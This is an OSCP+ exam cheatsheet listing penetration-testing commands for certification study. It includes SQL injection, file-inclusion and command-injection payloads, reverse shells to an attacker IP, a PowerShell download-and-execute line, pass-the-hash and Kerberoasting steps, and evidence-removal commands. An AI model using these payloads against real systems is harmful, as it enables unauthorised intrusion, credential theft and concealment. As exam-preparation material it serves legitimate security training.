# OSCP+ Cheatsheet: Essential Commands & Options
## 1. Network Scanning

| **Command** | **Usage / Options** |
|------------|----------------|
| `nmap -p- -sC -sV <IP>` | Full TCP scan, service & version detection |
| `nmap -p22,80,445 -A <IP>` | Aggressive scan for specific ports |
| `nmap --script smb-enum-shares,smb-enum-users -p445 <IP>` | SMB enumeration |
| `rustscan -a <IP> --ulimit 5000 | nmap -sC -sV -p <ports>` | Faster port scanning |

---
## 2. Web Enumeration & Exploitation

### 2.1 Web Scanning & Directory Bruteforce

| **Command** | **Usage / Options** |
|------------|----------------|
| `gobuster dir -u http://<IP> -w <wordlist>` | Directory brute-forcing |
| `nikto -h http://<IP>` | Web vulnerability scan |

### 2.2 SQL Injection (Manual) - **Where to Place: Form Fields / URL Parameters**

| **Payload** | **Usage** |
|------------|----------------|
| `' OR '1'='1' --` | Basic authentication bypass (input in username/password field) |
| `UNION SELECT 1,2,3--` | Test for SQLi (find number of columns in a URL parameter) |
| `SELECT table_name FROM information_schema.tables;` | Extract table names manually |

**Example Usage in URL:**  
```
http://<IP>/page.php?id=1' OR '1'='1' --
```

### 2.3 Local File Inclusion (LFI) - **Where to Place: URL Parameters**

| **Payload** | **Usage** |
|------------|----------------|
| `../../../../etc/passwd` | Read Linux `/etc/passwd` (if LFI is possible) |
| `php://filter/convert.base64-encode/resource=config.php` | Base64 encode file to bypass filters |

**Example Usage in URL:**  
```
http://<IP>/page.php?file=../../../../etc/passwd
```

### 2.4 Remote File Inclusion (RFI) - **Where to Place: URL Parameters**

| **Payload** | **Usage** |
|------------|----------------|
| `http://<YOUR_IP>/shell.php` | Inject remote shell via file inclusion |

**Example Usage in URL:**  
```
http://<IP>/page.php?file=http://<YOUR_IP>/shell.php
```

### 2.5 Command Injection - **Where to Place: Form Fields / URL Parameters**

| **Payload** | **Usage** |
|------------|----------------|
| `; whoami` | Linux command injection (form field, URL parameter) |
| `&& ping -c1 <YOUR_IP>` | Test if remote system allows command execution |

**Example Usage in URL:**  
```
http://<IP>/search.php?q=hello;whoami
```

### 2.6 File Upload Bypass - **Where to Place: File Upload Form Fields**

| **Payload** | **Usage** |
|------------|----------------|
| `.php5`, `.phtml`, `.jsp` | Change extension to bypass file restrictions |
| `GIF89a;` + PHP shell | Inject PHP shell in image files |

---
## 3. SMB & Network Enumeration
| **Command** | **Usage / Options** |
|------------|----------------|
| `smbclient -L //<IP> -N` | List SMB shares (null session) |
| `smbmap -H <IP>` | Check SMB share permissions |
| `rpcclient -U "" <IP>` | Enumerate SMB RPC info |

---
## 4. Reverse Shells

### 4.1 Linux Reverse Shells

| **Command** | **Usage / Options** |
|------------|----------------|
| `nc -e /bin/bash <YOUR_IP> <PORT>` | Netcat reverse shell |
| `bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1` | Bash reverse shell |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell (Linux) |

### 4.2 Windows Reverse Shells

| **Command** | **Usage / Options** |
|------------|----------------|
| `nc.exe -e cmd.exe <YOUR_IP> <PORT>` | Windows reverse shell |
| `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<YOUR_IP>', <PORT>);"` | PowerShell reverse shell |

---
## 5. Buffer Overflow

| **Command** | **Usage / Options** |
|------------|----------------|
| `msf-pattern_create -l 3000` | Generate unique pattern |
| `msf-pattern_offset -q <EIP_value>` | Find offset in buffer overflow |
| `!mona find -s "\xff\xe4" -m <module>` | Find JMP ESP in Immunity Debugger |

---
## 6. Privilege Escalation

### 6.1 Linux Privilege Escalation

| **Command** | **Usage / Options** |
|------------|----------------|
| `sudo -l` | Check sudo privileges |
| `find / -perm -4000 2>/dev/null` | Find SUID binaries |
| `grep -Ri password /etc/` | Search for plaintext passwords |

### 6.2 Windows Privilege Escalation

| **Command** | **Usage / Options** |
|------------|----------------|
| `whoami /priv` | List privileges (look for SeImpersonate) |
| `wmic service get name,displayname,pathname,startmode` | Check for unquoted service paths |
| `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<YOUR_IP>/winPEAS.bat')"` | Run WinPEAS for Windows privesc |

---
## 7. Active Directory Attacks

| **Command** | **Usage / Options** |
|------------|----------------|
| `net user /domain` | Enumerate domain users |
| `net group "Domain Admins" /domain` | List Domain Admins |
| `nltest /dclist:<DOMAIN>` | Get list of domain controllers |
| bloodhound-python -u $USER -p '$PASSWORD' -d $DOMAIN -dc $FQDN -c all -ns $DOMAINIP
 | Collect AD data for BloodHound |

### 7.1 Credential Attacks

| **Command** | **Usage / Options** |
|------------|----------------|
| `GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -request` | Extract service tickets |
| `hashcat -m 13100 kerbhashes.txt rockyou.txt` | Crack Kerberoast hashes |
| `wmiexec.py <DOMAIN>/<USER>@<IP> -hashes <NTLMHASH>` | Authenticate using NTLM hash |

---
## 8. Lateral Movement & Post-Exploitation

| **Command** | **Usage / Options** |
|------------|----------------|
| `evil-winrm -i <IP> -u <USER> -p <PASS>` | Remote PowerShell execution |
| `psexec.py <DOMAIN>/<Administrator>@<IP> -hashes <NTLMHASH>` | Execute commands remotely |
| `ssh -L 8888:127.0.0.1:80 user@pivot_host` | Local port forwarding |
| `proxychains nmap -sT -Pn -p 80,445 10.10.10.5` | Scan through a pivot using proxychains |

---
## 9. Cleanup & Reporting

| **Command** | **Usage / Options** |
|------------|----------------|
| `rm /tmp/shell.py` | Remove evidence on Linux |
| `del C:\Users\Public\winPEAS.exe` | Remove forensic traces on Windows |
| `gnome-screenshot -a` | Take a screenshot for documentation |

---

### 📌 **How to Use This Cheatsheet**
- Use **Ctrl+F** or **grep** to quickly find relevant commands.
- Modify payloads as needed (adjust IPs, ports, and paths).
- Follow exam restrictions: **no automated exploitation tools (e.g., sqlmap, Nessus)**.



